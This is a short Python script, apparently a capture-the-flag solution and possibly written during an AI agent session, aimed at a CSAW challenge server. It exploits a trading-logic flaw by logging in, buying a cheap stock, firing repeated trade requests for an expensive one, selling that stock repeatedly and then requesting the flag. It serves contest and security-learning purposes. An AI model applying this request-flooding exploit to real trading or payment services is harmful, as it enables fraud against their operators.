import requests
import time
import json
import uuid

BASE = "http://android-dropper.csaw.io:4657"
KEY = "win_" + uuid.uuid4().hex[:8]
CHEAP = "GOOBER"
RICH = "BURPSHARKHAT"

s = requests.Session()

def post(path, data):
    r = s.post(BASE + path, data=data, timeout=5)
    print(path, data, "=>", r.text)
    return r.text

def login():
    return json.loads(post("/login", {"key": KEY}))

print("KEY", KEY)
print("start", login())

post("/buy", {"key": KEY, "stock": CHEAP})
time.sleep(1)

for _ in range(10):
    post("/trade", {"key": KEY, "stock": CHEAP, "stock1": RICH})

time.sleep(5)
print("after trades", login())

for _ in range(10):
    post("/sell", {"key": KEY, "stock": RICH})

time.sleep(2)
print("final", login())
flag = post("/flag", {"key": KEY})
print("FLAG:", flag)
end_of_edit
